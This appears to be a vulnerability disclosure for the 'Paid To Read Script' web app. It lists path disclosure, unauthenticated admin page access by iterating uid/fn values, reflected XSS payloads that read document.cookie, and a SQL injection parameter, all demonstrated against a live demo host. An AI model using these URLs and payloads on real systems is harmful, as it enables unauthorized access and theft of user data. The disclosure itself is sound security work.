### Paid To Read Script  SQL Injection/XSS/Unauthorized access/Sensitive information leak

#### ADLab of Venustech


Well, when I pentest the official demo site of Paid To Read Script, I found some vulnerabilities here.


#### Sensitive information leak

When you visit the some page with wrong or invalid parameter value, you can get some sensitive information like absolute-path without login.

```
http://74.124.215.220/~paioread/admin/userview.php?uid=3

http://74.124.215.220/~paioread/admin/userview.php?uid=12%27

Get absolute-path:
/home/paioread/public_html/admin/userview.php
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/paid-to-read-script/info_leak.png)


#### Unauthorized access:

For example, we can vist some admin panel webpages easily , without login into the admin panel.

By the way, we can try to iter the parameter values , then get those important sensitive user informations in the database easily.


Key parameter: "fn"
```
http://74.124.215.220/~paioread/admin/viewvisitcamp.php?fn=7
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/paid-to-read-script/access1.png)

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/paid-to-read-script/access2.png)


Key parameter: "uid"
```
http://74.124.215.220/~paioread/admin/userview.php?uid=13
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/paid-to-read-script/access3.png)

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/paid-to-read-script/access4.png)


#### xss:

There're some reflect-xss in this system, for example:

http://74.124.215.220/~paioread/referrals.php?id=10&tier=1%27%22%3E%3Csvg/onload=alert(document.cookie)%3E%3C%27%22

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/paid-to-read-script/xss1.png)

http://74.124.215.220/~paioread/admin/userview.php?uid=13%27%22%3E%3Csvg/onload=alert(document.cookie)%3E%3C%27%22

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/paid-to-read-script/xss2.png)



#### SQL Injection:


Key parameter: "id"

```
http://74.124.215.220/~paioread/referrals.php?id=10&tier=1
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/paid-to-read-script/sqli.png)

You can see,  we can obtain the current database user or more sensitive data now!


